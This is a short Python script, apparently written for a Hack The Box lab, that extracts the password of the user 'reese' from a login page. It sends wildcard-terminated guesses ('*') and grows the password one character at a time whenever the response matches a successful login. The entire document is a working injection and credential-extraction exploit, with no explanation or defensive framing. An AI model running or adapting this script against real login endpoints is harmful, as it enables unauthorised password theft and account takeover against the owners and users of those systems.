import requests
import os
url = "http://HTB-IP/login/"
pd_list=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F",
"G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","#","$","%","@","!","0","1","2","3","4","5","6","7","8","9",
"{","}","[","]","_","&","^"," "]
username = 'reese'
pwd = ''
data_to={"username":"reese","password":"*"}
on_success=requests.post(url,data={"username":"reese","password":"*"}).text
while(1):
    for c in pd_list:
        temp=pwd+c+'*'
        payload={"username":"reese","password":temp}
        send = requests.post(url,data=payload).text
        if(requests.post(url,data={'username':username,'password':pwd}).text==on_success and requests.post(url,data=payload).text!=on_success):
            print("password found : "+pwd)
            exit()
        elif(send==on_success):
            pwd=pwd+c
            
        os.system("clear")
        print("current temp: "+temp+"  current pwd : "+pwd)
print(pwd)

